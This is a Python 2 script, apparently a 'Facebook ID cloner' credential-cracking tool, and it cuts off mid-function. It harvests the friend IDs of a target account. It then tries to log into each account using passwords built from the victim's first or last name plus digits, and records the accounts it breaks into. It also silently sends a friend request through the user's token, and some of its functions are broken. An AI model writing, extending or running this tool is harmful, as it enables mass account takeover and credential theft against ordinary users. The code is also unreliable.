#!/usr/bin/python2
#coding=utf-8
#HAUNTERBOY ALAMIN THE OFFICAL PROGRAMMER 
#FBCLONING COMMMAD MAKER 
#HAUNTERBOY 
#ID CLONER (Haunterboy Alamin)


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print"\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:HAUNTERBOY ALAMIN
#### LOGO ####
logo = """
   \033[1;96m   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;96m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;96m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;96m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;96m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;96m ▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒▒▒▒▒▒▒
    \033[1;92m ▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒░░░░░░░░████████████████████████░░░░░░░░░░▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒▒▒▒▒▒▒
    \033[1;91m ▒▒▒▒▒▒▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒▒▒▒▒▒▒
    \033[1;93m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    \033[1;93m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████▒▒▒▒▒▒
    \033[1;93m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████▒▒▒▒▒▒
    \033[1;93m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████▒▒▒▒▒▒
    \033[1;93m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████▒▒▒▒▒▒
    \033[1;93m ▒▒▒▒▒▒████████████████████████████████████████████▒▒▒▒▒▒




\033[1;97m
░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗██████╗░
\033[1;94m██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗
\033[1;91m██║░░╚═╝██║░░░░░██║░░██║██╔██╗██║█████╗░░██████╔╝
\033[1;92m██║░░██╗██║░░░░░██║░░██║██║╚████║██╔══╝░░██╔══██╗
\033[1;91m╚█████╔╝███████╗╚█████╔╝██║░╚███║███████╗██║░░██║
\033[1;92m░╚════╝░╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝

\033[0;95m╭════════════════════════════════════════════════════════╮
\033[0;91m║\033[0;91mAUTHOR : \033[0;96mHAUNTERBOY ALAMIN                     \033[0;91m        ║
\033[0;91m║\033[0;91mFacebook  :\033[0;96m MD ALAMIN KHAN                          \033[0;91m        ║
\033[0;91m║\033[0;91mFacebook Contact:\033[0;96m https://www.facebook.com/alaminkhan.60 ║
\033[0;95m╰════════════════════════════════════════════════════════╯

"""
os.system("clear") 
print """
\033[1;96m __________________________________111_____________________________
\033[1;96m _________________________________1¶¶11____________________________
\033[1;96m ________________________________¶¶¶¶¶1¶________1¶_________________
\033[1;96m _________________________________1¶1¶¶1________1¶¶¶_______________
\033[1;96m _________________¶¶1_____________1¶1¶¶___________¶¶¶1_____________
\033[1;96m ________________¶¶1______________1¶¶¶¶____________1¶¶1____________
\033[1;96m _______________¶¶1_______________111¶¶_____________1¶¶____________
\033[1;96m ______________1¶¶________________1¶1¶¶______________1¶¶___________
\033[1;96m ______________¶¶¶________________1¶1¶¶_______________¶¶1__________
\033[1;96m ______________¶¶¶________________1¶11¶1______________¶¶¶__________
\033[1;96m ______________¶¶¶________1_______1¶11¶1____¶¶________¶¶¶__________
\033[1;96m ______________1¶¶¶_______1¶¶______¶11¶1___¶¶________1¶¶¶__________ 
\033[1;96m _______________¶¶¶¶_______¶¶¶1____11_¶¶__¶¶_________¶¶¶¶__________
 _______________1¶¶¶¶¶1___1¶¶¶¶____111¶1__¶¶1_______¶¶¶¶¶__________
\033[1;96m ________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___¶11¶¶__¶¶¶1___1¶¶¶11¶1__________
\033[1;96m _________________1¶¶¶¶¶¶¶¶¶¶¶¶¶___1¶1¶¶__¶¶¶¶¶¶¶¶¶¶1_¶¶___________
\033[1;96m __________________1¶¶¶¶¶¶¶¶¶¶¶1___¶¶1¶¶__1¶¶¶_11____1¶1___________
\033[1;96m _____________________¶¶¶¶¶__1¶____¶¶1¶¶___1¶1_______1_____________
\033[1;96m _________________________1¶¶1_____¶¶11¶____¶¶¶¶¶__________________
\033[1;96m ________________________1¶1__¶¶¶1_¶¶¶¶¶11¶¶¶¶__¶¶1________________
\033[1;96m ______________________1¶¶11¶1___111¶¶¶¶¶¶11___¶¶111_______________
\033[1;91m ______________________¶¶¶¶¶¶¶__¶11¶1__11_11__1¶¶¶¶1_______________
\033[1;91m _____________________¶¶11¶¶1_¶¶¶¶¶11__1_¶¶¶¶1_¶¶¶1¶1______________
\033[1;91m _____________________¶1_1¶¶_1¶¶1_11_¶¶_¶¶11¶¶111¶1_¶1_____________
\033[1;91m _____________________¶1_¶_1¶¶¶____¶¶¶11¶¶__¶¶¶__¶¶1¶1_____________
\033[1;91m _____________________¶1¶1__1¶¶___¶¶¶¶1¶¶¶¶111____¶¶¶1_____________
\033[1;91m _____________________¶¶¶_________¶¶¶¶1¶¶1¶¶¶1____1¶1______________
\033[1;91m _____________________1¶¶_________1¶¶¶¶_111¶¶¶¶___¶¶_______________
\033[1;91m ________________1¶____1¶_________1¶¶¶¶_1¶_1¶¶¶¶_1¶__1_____________
\033[1;91m ________________1¶_______________¶1_11__¶1__¶¶¶¶____¶¶____________
\033[1;91m ________________1¶______________¶¶¶11¶___¶___¶¶¶1___1¶¶___________
\033[1;91m ________________¶¶_____________¶¶¶¶¶¶¶1¶1¶1__¶¶¶¶____¶¶1__________
\033[1;91m _______________1¶¶____________¶¶__¶¶¶¶_¶¶1___¶¶¶¶____1¶¶__________
\033[1;91m _______________¶¶1__________1¶¶___1¶¶¶_¶¶____¶¶¶11¶11¶¶¶1_________
\033[1;91m ______________1¶¶__________1¶¶_____¶¶¶_1¶___1¶¶¶¶¶¶¶¶¶¶¶1_________
\033[1;91m _____________1¶¶¶__________¶¶______¶1¶1_¶__1¶¶¶¶¶¶¶¶¶¶¶¶1_________
\033[1;91m _____________¶¶¶1_________¶¶1______¶1¶1_¶_1¶¶¶¶____1¶¶¶¶1_________
\033[1;91m _____________¶¶¶_________1¶¶_______¶¶¶1_¶¶¶¶1_______¶¶¶¶__________
\033[1;91m ____________1¶¶¶_________¶¶¶_______1¶¶1¶¶¶¶_________¶¶¶¶__________
\033[1;91m ____________1¶¶¶1____¶¶__1¶¶1______1¶¶¶¶¶1__________¶¶¶1__________
\033[1;91m ____________¶¶¶¶¶___¶¶1___¶¶¶______¶¶¶¶1¶__________¶¶¶1___________
\033[1;91m ____________1¶¶¶¶1_1¶¶____¶¶¶¶___¶¶¶¶¶1_¶_________1¶¶¶____________
\033[1;91m _____________¶¶¶¶¶11¶1____1¶¶¶11¶¶¶11¶¶_¶________1¶¶¶_____________
\033[1;92m _____________¶¶¶¶¶¶¶¶¶_____1¶¶1¶¶¶__1¶¶_¶1______1¶¶¶______________
\033[1;92m ______________¶¶¶¶¶¶¶¶1______1¶¶¶1__¶¶¶_¶1_____1¶¶1_______________
\033[1;92m ______________1¶¶¶¶¶¶¶¶1___1¶¶¶¶1¶1_1¶¶_¶_____1¶¶_________________
\033[1;92m _______________1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶11¶¶_1_____¶¶__________________
\033[1;92m _________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_¶¶¶¶1¶_11___¶¶___________________
\033[1;92m ____________________1111111¶¶¶¶1__1¶¶¶¶1¶1__1¶____________________
\033[1;92m __________________________1¶¶¶¶1____1¶¶¶¶¶1__1____________________
\033[1;92m __________________________¶¶¶¶¶1____11¶¶¶¶¶¶¶_____________________
\033[1;92m __________________________¶¶¶¶¶¶____¶11_¶¶¶¶¶¶1___________________
\033[1;92m __________________________1¶¶¶¶¶¶___11¶_¶1_1¶¶¶¶__________________
\033[1;92m ___________________________¶¶¶¶¶¶1___1__¶1__1¶¶¶¶_________________
\033[1;92m ____________________________¶¶¶¶¶¶1__1__¶¶____¶¶¶¶________________
\033[1;92m _____________________________¶¶¶¶¶¶¶_11_¶¶_____¶¶¶¶_______________
\033[1;92m ______________________________¶¶¶¶¶¶¶¶¶_¶¶_____1¶¶¶1______________
\033[1;92m _______________________________1¶¶¶¶¶¶¶11¶______¶¶¶1______________
\033[1;92m _________________________________1¶¶¶¶¶11¶¶¶1___¶¶¶¶1_____________
\033[1;92m ___________________________________1¶¶1_1¶¶¶¶¶__1¶¶¶1_____________
\033[1;92m _____________________________________111¶¶¶¶¶¶¶_1¶¶¶1_____________
\033[1;92m _____________________________________¶11¶¶_1¶¶¶¶1¶¶¶¶_____________
\033[1;92m _____________________________________¶11¶¶___¶¶¶¶¶¶¶¶_____________
\033[1;92m _____________________________________¶1¶¶¶____¶¶¶¶¶¶1_____________
\033[1;92m _____________________________________11¶¶¶____1¶¶¶¶¶1_____________
\033[1;92m ______________________________________¶¶¶¶_____¶¶¶¶¶______________
\033[1;92m ______________________________________¶¶¶¶_____1¶¶¶1______________
\033[1;92m ______________________________________¶¶¶¶_____¶¶¶¶_______________
\033[1;92m ______________________________________¶¶¶¶____1¶¶¶1_______________
\033[1;92m ______________________________________1¶¶1____¶¶¶1________________
\033[1;92m _______________________________________¶¶1___¶¶¶1_________________
\033[1;92m _______________________________________¶¶___¶¶¶1__________________
\033[1;92m ________________________________________1_1¶¶¶____________________
\033[1;92m _________________________________________¶¶¶¶_____________________
\033[1;92m ________________________________________¶¶¶1______________________
\033[1;92m _______________________________________¶¶¶1_______________________
\033[1;92m ______________________________________1¶¶1________________________
\033[1;92m ______________________________________¶¶1_________________________
\033[1;92m _____________________________________1¶¶__________________________
\033[1;92m ______________________________________¶¶__________________________
\033[1;92m ______________________________________1¶1_________________________
\033[1;92m _______________________________________11_________________________
"""
CorrectUsername = "ALAMINKHAN"
CorrectPassword = "LoveU"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;96mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as HAUNTERBOY ALAMIN" #Dev:HAUNTERBOY ALAMIN
	    time.sleep(2)
            loop = 'false'
            os.system('xdg-open https://www.facebook.com/alaminkhan.60')
        else:
            print "\033[1;96mWrong Password"
            os.system('xdg-open https://www.facebook.com/alaminkhan.60')
    else:
        print "\033[1;96mWrong Username"
        os.system('xdg-open https://www.facebook.com/alaminkhan.60')
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print 42*"\033[1;97m="
	print "\033[1;91m》》》 \033[1;92m[1]\033[1;91m\033[1;97m Login with Facebook  "
        time.sleep(0.05)
        print "\033[1;91m》》》 \033[1;92m[2]\033[1;91m\033[1;94m Login with access token "
        time.sleep(0.05)
        print "\033[1;91m》》》 \033[1;92m[3]\033[1;91m\033[1;93m Download Access token"
        print "\033[1;91m》》》 \033[1;92m[4]\033[1;91m\033[1;93m Contact On Facebook For Help"
	time.sleep(0.05)
	print "\033[1;91m》》》 \033[1;92m[0]\033[1;96m Logout        "
        print 42*"\033[1;97m="
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option═╬══➤\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	       tokenz()
        elif peak =="3":
	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
	        login()
        elif peak =="4":
	        os.system('xdg-open https://www.facebook.com/alaminkhan.60')	        
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
			
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print 42*"\033[1;97m="
		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		print 42*"\033[1;97m="
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://www.facebook.com/alaminkhan.60')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mCHECK YOUR ACCOUNT IS CHECKPOINT")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	print 42*"="
	toket = raw_input("\033[1;91m[+]\033[1;92m Paste Token\033[1;91m :\033[1;95>>\033[1;93m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
        print 42*"\033[1;97m="
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	print 42*"\033[1;97m="
	print "\033[1;32;94m》》》 \033[1;91m[1] \033[1;93m start Cloning "
	print "\033[1;32;93m》》》 \033[1;91m[2] \033[1;96m Update This Tool "																													
	print "\033[1;32;94m》》》 \033[1;96m[0] Log out"
	print 42*"\033[1;97m="
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m═╬══➤ \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
		print logo
		print 42*"="
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print 42*"="
	jalan( "\x1b[1;32;92m》》》 \033[1;33;98m [1] \033[1;33;92m Crack From Public ID") 
	jalan( "\x1b[1;32;36m》》》 \033[1;33;96m[0] Back") 
	print 42*"="
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m═╬══➤ \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;97m="
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter FACEBOOK ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak == "0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ❈     \033[1;91mCheckpoint Account Open After 7 days      \033[1;94m  ❈"
	print 42*"\033[1;97m="

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:HAUNTERBOY ALAMIN
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=2377599Tech-ab%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'											
				print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;91m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				    print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mName \x1b[1;91m    : \x1b[1;91m' + b ['name']
				    print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user
				    print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;91mPassword \x1b[1;93m: \x1b[1;91m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '12345'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'											
				            print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;92mName \x1b[1;91m    : \x1b[1;92m' + b['name']											
				            print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;92mID \x1b[1;91m      : \x1b[1;92m' + user								
				            print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;92mPassword \x1b[1;92m: \x1b[1;92m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				               print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']
				               print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user
				               print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92m[HACK-OPEN AFTER 3HOURS]'								
						       print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;92mName \x1b[1;92m    : \x1b[1;92m' + b['name']									
						       print '\x1b[1;91m[•⊱🌼⊰•] \x1b[1;92mID \x1b[1;92m      : \x1b[1;92m' + user							
						       print '\x1b[1;92m[•⊱✿⊰•] \x1b[1;92mPassword \x1b[1;92m: \x1b[1;92m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96m[CHECKPOINT-OPEN AFTER 7 DAYS]'
				                           print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⊱🌼⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['last_name'] + '12345'											
